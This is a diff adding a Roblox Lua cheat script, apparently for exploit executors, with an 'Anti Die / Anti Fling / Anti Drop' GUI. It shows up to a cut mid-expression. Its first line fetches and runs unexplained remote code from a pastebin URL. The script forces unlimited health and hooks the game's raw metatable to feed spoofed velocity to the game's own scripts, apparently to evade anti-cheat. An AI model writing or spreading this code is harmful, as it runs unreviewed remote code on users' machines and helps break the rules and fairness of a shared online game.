@@ -1,0 +1,977 @@
+loadstring(game:HttpGet("https://pastefy.app/DTHKPzcn/raw"))()
+
+repeat task.wait() until game:IsLoaded()
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService     = game:GetService("TweenService")
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
+
+local LP               = Players.LocalPlayer
+local PlayerGui        = LP:WaitForChild("PlayerGui")
+
+local FICTION_LOGO_ID  = "rbxassetid://89031871207413"
+local BG_ASSET         = "rbxassetid://124722157057568"
+local CONFIG_FILE      = "FictionAntiDie_Config.json"
+
+local FULL_W, FULL_H   = 248, 204
+local MINI_W, MINI_H   = 220, 48
+local HEADER_H         = 72
+
+local active       = false
+local antiFlingOn  = false
+local antiDropOn   = false
+local uiLocked     = false
+local isMinimized  = false
+
+local function saveConfig()
+	pcall(function()
+		if not writefile then return end
+		writefile(CONFIG_FILE, HttpService:JSONEncode({
+			active      = active,
+			antiFlingOn = antiFlingOn,
+			antiDropOn  = antiDropOn,
+			uiLocked    = uiLocked,
+			isMinimized = isMinimized,
+		}))
+	end)
+end
+
+local function loadConfig()
+	pcall(function()
+		if not (readfile and isfile and isfile(CONFIG_FILE)) then return end
+		local data = HttpService:JSONDecode(readfile(CONFIG_FILE))
+		if type(data) ~= "table" then return end
+		if data.active == true then active = true end
+		if data.antiFlingOn == true then antiFlingOn = true end
+		if data.antiDropOn == true then antiDropOn = true end
+		if data.uiLocked ~= nil then uiLocked = data.uiLocked end
+		if data.isMinimized == true then isMinimized = true end
+	end)
+end
+
+loadConfig()
+
+local _antiDie = {
+	loop       = nil,
+	healthConn = nil,
+	stateConn  = nil,
+	diedConn   = nil,
+	charConn   = nil,
+	invincibleUntil = 0,
+	highlight  = nil,
+}
+
+local function superHeal(hum)
+	if not hum or not hum.Parent then return end
+	local maxH = hum.MaxHealth
+	if not maxH or maxH <= 0 then maxH = 100 end
+	pcall(function() hum.Health = maxH end)
+	_antiDie.invincibleUntil = tick() + 0.5
+	pcall(function()
+		local char = hum.Parent
+		if not char then return end
+		for _, c in ipairs(char:GetChildren()) do
+			if c:IsA("NumberValue") or c:IsA("IntValue") then
+				local n = c.Name:lower()
+				if n:find("health") or n:find("hp") or n:find("life") then
+					c.Value = maxH
+				end
+			elseif c:IsA("BoolValue") then
+				local n = c.Name:lower()
+				if n:find("dead") or n:find("died") then
+					c.Value = false
+				end
+			end
+		end
+		pcall(function()
+			if char:GetAttribute("Dead") ~= nil then char:SetAttribute("Dead", false) end
+			if char:GetAttribute("IsDead") ~= nil then char:SetAttribute("IsDead", false) end
+			if char:GetAttribute("Health") ~= nil then char:SetAttribute("Health", maxH) end
+		end)
+	end)
+end
+
+local function forceAlive(hum, root)
+	if not hum then return end
+	superHeal(hum)
+	pcall(function()
+		hum:ChangeState(Enum.HumanoidStateType.Running)
+		hum.PlatformStand = false
+		hum.Sit = false
+		hum.AutoRotate = true
+		hum.BreakJointsOnDeath = false
+	end)
+	if root and root.Parent then
+		pcall(function()
+			root.AssemblyAngularVelocity = Vector3.zero
+			root.AssemblyLinearVelocity = Vector3.new(0, math.max(root.AssemblyLinearVelocity.Y, 2), 0)
+			root.CFrame = CFrame.new(root.Position + Vector3.new(0, 2.5, 0))
+		end)
+	end
+end
+
+local function preventDamage(root, hum)
+	if not hum or not hum.Parent then return end
+	local maxH = hum.MaxHealth or 100
+	if tick() < (_antiDie.invincibleUntil or 0) then
+		if hum.Health < maxH then hum.Health = maxH end
+	end
+	local st = hum:GetState()
+	if st == Enum.HumanoidStateType.Physics
+		or st == Enum.HumanoidStateType.Ragdoll
+		or st == Enum.HumanoidStateType.FallingDown
+		or st == Enum.HumanoidStateType.Dead then
+		forceAlive(hum, root)
+	end
+	if hum.Health <= 0 then
+		forceAlive(hum, root)
+	end
+end
+
+local function applyHugeHealth(hum)
+	if not hum or not hum.Parent then return end
+	pcall(function()
+		hum.MaxHealth = math.huge
+		hum.Health = math.huge
+		hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+		hum.BreakJointsOnDeath = false
+	end)
+end
+
+local function opRecovery(hum, char)
+	if not hum or not hum.Parent then return end
+	if hum.Health <= 0 then
+		pcall(function()
+			hum.MaxHealth = math.huge
+			hum.Health = math.huge
+			hum.BreakJointsOnDeath = false
+		end)
+	end
+	if hum.Health < 10 then
+		pcall(function()
+			hum.PlatformStand = false
+			hum.Sit = false
+			hum.AutoRotate = true
+		end)
+		local hrp = char and char:FindFirstChild("HumanoidRootPart")
+		if hrp then
+			pcall(function()
+				hrp.AssemblyLinearVelocity = Vector3.new(
+					hrp.AssemblyLinearVelocity.X,
+					math.max(hrp.AssemblyLinearVelocity.Y, 0),
+					hrp.AssemblyLinearVelocity.Z
+				)
+			end)
+		end
+	end
+	if hum.Health <= 0 and hum:GetState() == Enum.HumanoidStateType.Dead then
+		pcall(function()
+			hum:ChangeState(Enum.HumanoidStateType.Running)
+			hum.Health = math.huge
+		end)
+		local hrp = char and char:FindFirstChild("HumanoidRootPart")
+		if hrp then
+			pcall(function()
+				hrp.CFrame = CFrame.new(hrp.Position + Vector3.new(0, 8, 0))
+				hrp.AssemblyLinearVelocity = Vector3.zero
+				hrp.AssemblyAngularVelocity = Vector3.zero
+			end)
+		end
+	end
+end
+
+local function ensureHighlight(char)
+	if not char then return end
+	if _antiDie.highlight and _antiDie.highlight.Parent then return end
+	pcall(function()
+		if _antiDie.highlight then _antiDie.highlight:Destroy() end
+		local hl = Instance.new("Highlight")
+		hl.Name = "FictionAllAntiDieHighlight"
+		hl.FillColor = Color3.fromRGB(255, 255, 255)
+		hl.FillTransparency = 0.7
+		hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+		hl.OutlineTransparency = 0.2
+		hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+		hl.Parent = char
+		_antiDie.highlight = hl
+	end)
+end
+
+local function clearHighlight()
+	if _antiDie.highlight then
+		pcall(function() _antiDie.highlight:Destroy() end)
+		_antiDie.highlight = nil
+	end
+end
+
+local function disconnectAll()
+	local A = _antiDie
+	if A.loop then pcall(function() A.loop:Disconnect() end); A.loop = nil end
+	if A.healthConn then pcall(function() A.healthConn:Disconnect() end); A.healthConn = nil end
+	if A.stateConn then pcall(function() A.stateConn:Disconnect() end); A.stateConn = nil end
+	if A.diedConn then pcall(function() A.diedConn:Disconnect() end); A.diedConn = nil end
+end
+
+local function monitorChar(char)
+	if not char then return end
+	local A = _antiDie
+	if A.healthConn then pcall(function() A.healthConn:Disconnect() end); A.healthConn = nil end
+	if A.stateConn then pcall(function() A.stateConn:Disconnect() end); A.stateConn = nil end
+	if A.diedConn then pcall(function() A.diedConn:Disconnect() end); A.diedConn = nil end
+
+	local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 3)
+	if not hum then return end
+
+	applyHugeHealth(hum)
+	ensureHighlight(char)
+
+	A.healthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
+		if not active then return end
+		applyHugeHealth(hum)
+		if hum.Health <= 0 then
+			forceAlive(hum, char:FindFirstChild("HumanoidRootPart"))
+			opRecovery(hum, char)
+		elseif hum.Health <= 25 then
+			superHeal(hum)
+			applyHugeHealth(hum)
+		end
+	end)
+
+	A.stateConn = hum.StateChanged:Connect(function(_, new)
+		if not active then return end
+		if new == Enum.HumanoidStateType.Dead
+			or new == Enum.HumanoidStateType.Physics
+			or new == Enum.HumanoidStateType.Ragdoll
+			or new == Enum.HumanoidStateType.FallingDown then
+			applyHugeHealth(hum)
+			forceAlive(hum, char:FindFirstChild("HumanoidRootPart"))
+			opRecovery(hum, char)
+		end
+	end)
+
+	A.diedConn = hum.Died:Connect(function()
+		if not active then return end
+		task.defer(function()
+			applyHugeHealth(hum)
+			forceAlive(hum, char:FindFirstChild("HumanoidRootPart"))
+			opRecovery(hum, char)
+		end)
+	end)
+
+	superHeal(hum)
+	applyHugeHealth(hum)
+end
+
+local function startAntiDie()
+	active = true
+	disconnectAll()
+	local A = _antiDie
+
+	A.loop = RunService.Heartbeat:Connect(function()
+		if not active then return end
+		local char = LP.Character
+		if not char then return end
+		local hum = char:FindFirstChildOfClass("Humanoid")
+		local root = char:FindFirstChild("HumanoidRootPart")
+		if not hum then return end
+
+		applyHugeHealth(hum)
+
+		if hum.Health <= 0 then
+			forceAlive(hum, root)
+			opRecovery(hum, char)
+			return
+		end
+		if hum.Health <= 25 then
+			superHeal(hum)
+			applyHugeHealth(hum)
+		end
+		preventDamage(root, hum)
+		if hum.Health < 20 and hum.Health > 0 then
+			superHeal(hum)
+			applyHugeHealth(hum)
+		end
+		opRecovery(hum, char)
+		if not A.highlight or not A.highlight.Parent then
+			ensureHighlight(char)
+		end
+	end)
+
+	if LP.Character then monitorChar(LP.Character) end
+	if not A.charConn then
+		A.charConn = LP.CharacterAdded:Connect(function(char)
+			if not active then return end
+			task.wait(0.08)
+			monitorChar(char)
+		end)
+	end
+end
+
+local function stopAntiDie()
+	active = false
+	disconnectAll()
+	clearHighlight()
+	local char = LP.Character
+	if char then
+		local hum = char:FindFirstChildOfClass("Humanoid")
+		if hum then
+			pcall(function()
+				hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+				hum.MaxHealth = 100
+				hum.Health = 100
+				hum.BreakJointsOnDeath = true
+			end)
+		end
+	end
+end
+
+local AntiFlingPlayersConns = {}
+local AntiFlingHeartbeat = nil
+local AntiFlingPlayerAdded = nil
+local AntiFlingPlayerRemoving = nil
+
+local function LimitPlayerVelocity(part)
+	local lv = part.AssemblyLinearVelocity
+	local av = part.AssemblyAngularVelocity
+	if lv.Magnitude > 100 then part.AssemblyLinearVelocity = lv.Unit * 100 end
+	if av.Magnitude > 75 then part.AssemblyAngularVelocity = av.Unit * 75 end
+end
+
+local function SetupPlayerAntiFling(player)
+	if AntiFlingPlayersConns[player] then pcall(function() AntiFlingPlayersConns[player]:Disconnect() end) end
+	AntiFlingPlayersConns[player] = player.CharacterAdded:Connect(function(char)
+		if antiFlingOn then
+			task.wait(0.25)
+			local hrp = char:WaitForChild("HumanoidRootPart", 10)
+			if hrp then pcall(function() hrp:SetNetworkOwner(nil) end) end
+		end
+	end)
+	if player.Character then
+		local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+		if hrp then pcall(function() hrp:SetNetworkOwner(nil) end) end
+	end
+end
+
+local function startAntiFling()
+	antiFlingOn = true
+	for _, p in ipairs(Players:GetPlayers()) do SetupPlayerAntiFling(p) end
+	AntiFlingPlayerAdded = Players.PlayerAdded:Connect(function(p)
+		if antiFlingOn then SetupPlayerAntiFling(p) end
+	end)
+	AntiFlingPlayerRemoving = Players.PlayerRemoving:Connect(function(p)
+		if AntiFlingPlayersConns[p] then
+			pcall(function() AntiFlingPlayersConns[p]:Disconnect() end)
+			AntiFlingPlayersConns[p] = nil
+		end
+	end)
+	AntiFlingHeartbeat = RunService.Heartbeat:Connect(function()
+		if not antiFlingOn then return end
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p.Character then
+				local hrp = p.Character:FindFirstChild("HumanoidRootPart")
+				if hrp then LimitPlayerVelocity(hrp) end
+			end
+		end
+	end)
+end
+
+local function stopAntiFling()
+	antiFlingOn = false
+	if AntiFlingHeartbeat then AntiFlingHeartbeat:Disconnect(); AntiFlingHeartbeat = nil end
+	if AntiFlingPlayerAdded then AntiFlingPlayerAdded:Disconnect(); AntiFlingPlayerAdded = nil end
+	if AntiFlingPlayerRemoving then AntiFlingPlayerRemoving:Disconnect(); AntiFlingPlayerRemoving = nil end
+	for _, c in pairs(AntiFlingPlayersConns) do pcall(function() c:Disconnect() end) end
+	AntiFlingPlayersConns = {}
+end
+
+local RawMetatableHooked = false
+local OldIndex = nil
+local OldNewIndex = nil
+local DroppedVelocity = Vector3.zero
+
+local function startAntiDrop()
+	antiDropOn = true
+	if RawMetatableHooked then return end
+	if not getrawmetatable then return end
+	local mt = getrawmetatable(game)
+	if not mt then return end
+	OldIndex = mt.__index
+	OldNewIndex = mt.__newindex
+	setreadonly(mt, false)
+	mt.__index = newcclosure(function(t, k)
+		if not checkcaller() and (k == "AssemblyLinearVelocity" or k == "Velocity") and typeof(t) == "Instance" and t:IsA("BasePart") and t.Name == "HumanoidRootPart" and LP.Character and t:IsDescendantOf(LP.Character) then
+			return DroppedVelocity
+		end
+		return OldIndex(t, k)
+	end)
+	mt.__newindex = newcclosure(function(t, k, v)
+		if not checkcaller() and (k == "AssemblyLinearVelocity" or k == "Velocity") and typeof(t) == "Instance" and t:IsA("BasePart") and t.Name == "HumanoidRootPart" and LP.Character and t:IsDescendantOf(LP.Character) then
+			DroppedVelocity = v
+			return
+		end
+		return OldNewIndex(t, k, v)
+	end)
+	setreadonly(mt, true)
+	RawMetatableHooked = true
+end
+
+local function stopAntiDrop()
+	antiDropOn = false
+	if not RawMetatableHooked then return end
+	local mt = getrawmetatable(game)
+	if mt and OldIndex then
+		setreadonly(mt, false)
+		mt.__index = OldIndex
+		mt.__newindex = OldNewIndex
+		setreadonly(mt, true)
+		OldIndex = nil
+		OldNewIndex = nil
+	end
+	RawMetatableHooked = false
+end
+
+local rotatingStrokes = {}
+
+local function AddAnimatedOutline(frame, thickness)
+	local stroke = Instance.new("UIStroke")
+	stroke.Thickness = thickness or 1.5
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	stroke.Color = Color3.fromRGB(255, 255, 255)
+	stroke.Transparency = 0
+	stroke.Parent = frame
+	local grad = Instance.new("UIGradient")
+	grad.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
+		ColorSequenceKeypoint.new(0.25, Color3.fromRGB(80, 80, 80)),
+		ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
+		ColorSequenceKeypoint.new(0.75, Color3.fromRGB(80, 80, 80)),
+		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255)),
+	})
+	grad.Rotation = 0
+	grad.Parent = stroke
+	table.insert(rotatingStrokes, grad)
+	return stroke
+end
+
+task.spawn(function()
+	while true do
+		RunService.Heartbeat:Wait()
+		for _, g in ipairs(rotatingStrokes) do
+			if g and g.Parent then
+				g.Rotation = (g.Rotation + 2) % 360
+			end
+		end
+	end
+end)
+
+local pingFillGrads = {}
+local pingStrokeGrads = {}
+
+local function pingOn(inst)
+	if not inst or not inst.Parent then return end
+	if inst:GetAttribute("_PingOn") then return end
+	inst:SetAttribute("_PingOn", true)
+	pcall(function()
+		inst.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		inst.BackgroundTransparency = 0
+	end)
+	local fill = Instance.new("UIGradient")
+	fill.Name = "_PingFill"
+	fill.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(200, 200, 200)),
+		ColorSequenceKeypoint.new(0.20, Color3.fromRGB(255, 255, 255)),
+		ColorSequenceKeypoint.new(0.40, Color3.fromRGB(180, 180, 180)),
+		ColorSequenceKeypoint.new(0.60, Color3.fromRGB(255, 255, 255)),
+		ColorSequenceKeypoint.new(0.80, Color3.fromRGB(200, 200, 200)),
+		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255)),
+	})
+	fill.Rotation = 0
+	fill.Parent = inst
+	table.insert(pingFillGrads, fill)
+	local stroke = inst:FindFirstChildWhichIsA("UIStroke")
+	if stroke then
+		local sg = Instance.new("UIGradient")
+		sg.Name = "_PingStroke"
+		sg.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
+			ColorSequenceKeypoint.new(0.35, Color3.fromRGB(120, 120, 120)),
+			ColorSequenceKeypoint.new(0.65, Color3.fromRGB(255, 255, 255)),
+			ColorSequenceKeypoint.new(1.00, Color3.fromRGB(80, 80, 80)),
+		})
+		sg.Parent = stroke
+		table.insert(pingStrokeGrads, sg)
+	end
+end
+
+local function pingOff(inst)
+	if not inst or not inst.Parent then return end
+	if not inst:GetAttribute("_PingOn") then return end
+	inst:SetAttribute("_PingOn", nil)
+	local fill = inst:FindFirstChild("_PingFill")
+	if fill then fill:Destroy() end
+	local stroke = inst:FindFirstChildWhichIsA("UIStroke")
+	if stroke then
+		local ss = stroke:FindFirstChild("_PingStroke")
+		if ss then ss:Destroy() end
+	end
+end
+
+task.spawn(function()
+	while true do
+		task.wait(2)
+		for _, g in ipairs(pingFillGrads) do
+			if g and g.Parent then
+				pcall(function()
+					TweenService:Create(g, TweenInfo.new(2, Enum.EasingStyle.Linear), { Rotation = g.Rotation + 360 }):Play()
+				end)
+			end
+		end
+		for _, g in ipairs(pingStrokeGrads) do
+			if g and g.Parent then
+				pcall(function()
+					TweenService:Create(g, TweenInfo.new(2.5, Enum.EasingStyle.Linear), { Rotation = g.Rotation + 360 }):Play()
+				end)
+			end
+		end
+	end
+end)
+
+for _, kid in pairs(PlayerGui:GetChildren()) do
+	if kid.Name == "FictionAntiDieGui" then kid:Destroy() end
+end
+pcall(function()
+	local cg = game:GetService("CoreGui"):FindFirstChild("FictionAntiDieGui")
+	if cg then cg:Destroy() end
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "FictionAntiDieGui"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 50
+pcall(function()
+	if syn and syn.protect_gui then syn.protect_gui(gui) end
+end)
+if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
+	gui.Parent = PlayerGui
+end
+
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.new(0, FULL_W, 0, FULL_H)
+main.Position = UDim2.new(0.5, -FULL_W / 2, 0.5, -FULL_H / 2)
+main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+main.BackgroundTransparency = 0.45
+main.BorderSizePixel = 0
+main.Active = true
+main.ClipsDescendants = true
+main.Parent = gui
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+AddAnimatedOutline(main, 1.5)
+
+local bgImage = Instance.new("ImageLabel")
+bgImage.Name = "Bg"
+bgImage.Size = UDim2.new(1, 0, 1, 0)
+bgImage.BackgroundTransparency = 1
+bgImage.Image = BG_ASSET
+bgImage.ImageTransparency = 0.35
+bgImage.ScaleType = Enum.ScaleType.Crop
+bgImage.ZIndex = 1
+bgImage.Parent = main
+Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 12)
+
+local header = Instance.new("Frame")
+header.Name = "Header"
+header.Size = UDim2.new(1, 0, 0, HEADER_H)
+header.BackgroundTransparency = 1
+header.BorderSizePixel = 0
+header.ZIndex = 3
+header.Parent = main
+
+local headerLogo = Instance.new("ImageLabel")
+headerLogo.Name = "FictionHeaderLogo"
+headerLogo.BackgroundTransparency = 1
+headerLogo.Size = UDim2.new(1, -4, 0, 110)
+headerLogo.Position = UDim2.new(0, 2, 0, -14)
+headerLogo.Image = FICTION_LOGO_ID
+headerLogo.ScaleType = Enum.ScaleType.Fit
+headerLogo.ZIndex = 4
+headerLogo.Parent = header
+
+local lockBtn = Instance.new("TextButton")
+lockBtn.Name = "LockBtn"
+lockBtn.Size = UDim2.new(0, 48, 0, 22)
+lockBtn.Position = UDim2.new(1, -84, 0, 8)
+lockBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+lockBtn.BackgroundTransparency = 0.5
+lockBtn.BorderSizePixel = 0
+lockBtn.Text = "LOCK"
+lockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+lockBtn.Font = Enum.Font.GothamBlack
+lockBtn.TextScaled = true
+lockBtn.AutoButtonColor = false
+lockBtn.ZIndex = 6
+lockBtn.Parent = header
+Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 7)
+local lockStroke = Instance.new("UIStroke", lockBtn)
+lockStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+lockStroke.Color = Color3.fromRGB(255, 255, 255)
+lockStroke.Thickness = 1
+lockStroke.Transparency = 0.35
+do
+	local ct = Instance.new("UITextSizeConstraint", lockBtn)
+	ct.MaxTextSize = 10
+	ct.MinTextSize = 7
+end
+do
+	local pad = Instance.new("UIPadding", lockBtn)
+	pad.PaddingLeft = UDim.new(0, 3)
+	pad.PaddingRight = UDim.new(0, 3)
+	pad.PaddingTop = UDim.new(0, 1)
+	pad.PaddingBottom = UDim.new(0, 1)
+end
+
+local minimizeBtn = Instance.new("TextButton")
+minimizeBtn.Name = "MinimizeBtn"
+minimizeBtn.Size = UDim2.new(0, 26, 0, 22)
+minimizeBtn.Position = UDim2.new(1, -32, 0, 8)
+minimizeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+minimizeBtn.BackgroundTransparency = 0.5
+minimizeBtn.BorderSizePixel = 0
+minimizeBtn.Text = "-"
+minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimizeBtn.Font = Enum.Font.GothamMedium
+minimizeBtn.TextSize = 18
+minimizeBtn.AutoButtonColor = false
+minimizeBtn.ZIndex = 6
+minimizeBtn.Parent = header
+Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(0, 7)
+local minStroke = Instance.new("UIStroke", minimizeBtn)
+minStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+minStroke.Color = Color3.fromRGB(255, 255, 255)
+minStroke.Thickness = 1
+minStroke.Transparency = 0.35
+
+local content = Instance.new("Frame")
+content.Name = "Content"
+content.Size = UDim2.new(1, 0, 1, -HEADER_H)
+content.Position = UDim2.new(0, 0, 0, HEADER_H)
+content.BackgroundTransparency = 1
+content.ZIndex = 2
+content.Parent = main
+
+local contentPad = Instance.new("UIPadding")
+contentPad.PaddingTop = UDim.new(0, 4)
+contentPad.PaddingBottom = UDim.new(0, 8)
+contentPad.PaddingLeft = UDim.new(0, 10)
+contentPad.PaddingRight = UDim.new(0, 10)
+contentPad.Parent = content
+
+local contentLayout = Instance.new("UIListLayout")
+contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
+contentLayout.Padding = UDim.new(0, 6)
+contentLayout.Parent = content
+
+local function createTogglePanel(labelText, layoutOrder)
+	local panel = Instance.new("Frame")
+	panel.Name = labelText:gsub("%s", "")
+	panel.Size = UDim2.new(1, 0, 0, 36)
+	panel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	panel.BackgroundTransparency = 0.30
+	panel.BorderSizePixel = 0
+	panel.ZIndex = 4
+	panel.LayoutOrder = layoutOrder
+	panel.Parent = content
+	Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)
+	AddAnimatedOutline(panel, 1.2)
+
+	local panelGrad = Instance.new("UIGradient")
+	panelGrad.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 30, 30)),
+		ColorSequenceKeypoint.new(0.40, Color3.fromRGB(12, 12, 12)),
+		ColorSequenceKeypoint.new(0.70, Color3.fromRGB(22, 22, 22)),
+		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(8, 8, 8)),
+	})
+	panelGrad.Rotation = 90
+	panelGrad.Parent = panel
+	table.insert(rotatingStrokes, panelGrad)
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, -68, 1, 0)
+	label.Position = UDim2.new(0, 11, 0, 0)
+	label.BackgroundTransparency = 1
+	label.Text = labelText
+	label.TextColor3 = Color3.fromRGB(255, 255, 255)
+	label.Font = Enum.Font.GothamBlack
+	label.TextSize = 11
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.TextStrokeTransparency = 0.55
+	label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+	label.ZIndex = 6
+	label.Parent = panel
+
+	local toggleBg = Instance.new("Frame")
+	toggleBg.Name = "ToggleBg"
+	toggleBg.Size = UDim2.new(0, 42, 0, 20)
+	toggleBg.Position = UDim2.new(1, -52, 0.5, -10)
+	toggleBg.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	toggleBg.BorderSizePixel = 0
+	toggleBg.ZIndex = 6
+	toggleBg.Parent = panel
+	Instance.new("UICorner", toggleBg).CornerRadius = UDim.new(1, 0)
+	AddAnimatedOutline(toggleBg, 1)
+
+	local toggleKnob = Instance.new("Frame")
+	toggleKnob.Name = "Knob"
+	toggleKnob.Size = UDim2.new(0, 14, 0, 14)
+	toggleKnob.Position = UDim2.new(0, 3, 0.5, -7)
+	toggleKnob.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+	toggleKnob.BorderSizePixel = 0
+	toggleKnob.ZIndex = 7
+	toggleKnob.Parent = toggleBg
+	Instance.new("UICorner", toggleKnob).CornerRadius = UDim.new(1, 0)
+
+	local hitBtn = Instance.new("TextButton")
+	hitBtn.Size = UDim2.new(1, 0, 1, 0)
+	hitBtn.BackgroundTransparency = 1
+	hitBtn.Text = ""
+	hitBtn.ZIndex = 8
+	hitBtn.Parent = panel
+
+	return panel, toggleBg, toggleKnob, hitBtn
+end
+
+local antiDiePanel, antiDieBg, antiDieKnob, antiDieBtn = createTogglePanel("Anti Die", 1)
+local antiFlingPanel, antiFlingBg, antiFlingKnob, antiFlingBtn = createTogglePanel("Anti Fling", 2)
+local antiDropPanel, antiDropBg, antiDropKnob, antiDropBtn = createTogglePanel("Anti Drop", 3)
+
+local function setToggleVisual(bg, knob, on)
+	if on then
+		TweenService:Create(bg, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		}):Play()
+		TweenService:Create(knob, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+			Position = UDim2.new(1, -17, 0.5, -7),
+			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		}):Play()
+		pingOff(bg)
+		pingOn(bg)
+	else
+		pingOff(bg)
+		TweenService:Create(bg, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+		}):Play()
+		TweenService:Create(knob, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			Position = UDim2.new(0, 3, 0.5, -7),
+			BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+		}):Play()
+	end
+end
+
+local function flipAntiDie(state)
+	if state then
+		startAntiDie()
+	else
+		stopAntiDie()
+	end
+	setToggleVisual(antiDieBg, antiDieKnob, active)
+	saveConfig()
+end
+
+local function flipAntiFling(state)
+	if state then
+		startAntiFling()
+	else
+		stopAntiFling()
+	end
+	setToggleVisual(antiFlingBg, antiFlingKnob, antiFlingOn)
+	saveConfig()
+end
+
+local function flipAntiDrop(state)
+	if state then
+		startAntiDrop()
+	else
+		stopAntiDrop()
+	end
+	setToggleVisual(antiDropBg, antiDropKnob, antiDropOn)
+	saveConfig()
+end
+
+antiDieBtn.MouseButton1Click:Connect(function()
+	flipAntiDie(not active)
+end)
+antiFlingBtn.MouseButton1Click:Connect(function()
+	flipAntiFling(not antiFlingOn)
+end)
+antiDropBtn.MouseButton1Click:Connect(function()
+	flipAntiDrop(not antiDropOn)
+end)
+
+local function refreshLock()
+	if uiLocked then
+		lockBtn.Text = "UNLOCK"
+	else
+		lockBtn.Text = "LOCK"
+	end
+end
+refreshLock()
+
+lockBtn.MouseButton1Click:Connect(function()
+	uiLocked = not uiLocked
+	refreshLock()
+	saveConfig()
+end)
+
+local function applyMinimize(state)
+	isMinimized = state
+	if state then
+		content.Visible = false
+		header.Size = UDim2.new(1, 0, 1, 0)
+		headerLogo.Visible = true
+		headerLogo.Size = UDim2.new(1, -88, 0, 56)
+		headerLogo.Position = UDim2.new(0, 2, 0.5, -28)
+		TweenService:Create(main, TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+			Size = UDim2.new(0, MINI_W, 0, MINI_H)
+		}):Play()
+		minimizeBtn.Text = "+"
+		lockBtn.Size = UDim2.new(0, 44, 0, 20)
+		minimizeBtn.Size = UDim2.new(0, 24, 0, 20)
+		lockBtn.Position = UDim2.new(1, -74, 0.5, -10)
+		minimizeBtn.Position = UDim2.new(1, -28, 0.5, -10)
+	else
+		content.Visible = true
+		header.Size = UDim2.new(1, 0, 0, HEADER_H)
+		headerLogo.Visible = true
+		headerLogo.Size = UDim2.new(1, -4, 0, 110)
+		headerLogo.Position = UDim2.new(0, 2, 0, -14)
+		TweenService:Create(main, TweenInfo.new(0.32, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+			Size = UDim2.new(0, FULL_W, 0, FULL_H)
+		}):Play()
+		minimizeBtn.Text = "-"
+		lockBtn.Size = UDim2.new(0, 48, 0, 22)
+		minimizeBtn.Size = UDim2.new(0, 26, 0, 22)
+		lockBtn.Position = UDim2.new(1, -84, 0, 8)
+		minimizeBtn.Position = UDim2.new(1, -32, 0, 8)
+	end
+	saveConfig()
+end
+
+minimizeBtn.MouseButton1Click:Connect(function()
+	applyMinimize(not isMinimized)
+end)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+	if processed then return end
+	if input.KeyCode == Enum.KeyCode.LeftControl then
+		main.Visible = not main.Visible
+	end
+end)
+
+do
+	local dragging, dragStart, startPos
+	header.InputBegan:Connect(function(input)
+		if uiLocked then return end
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = main.Position
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if not dragging then return end
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			local delta = input.Position - dragStart
+			main.Position = UDim2.new(
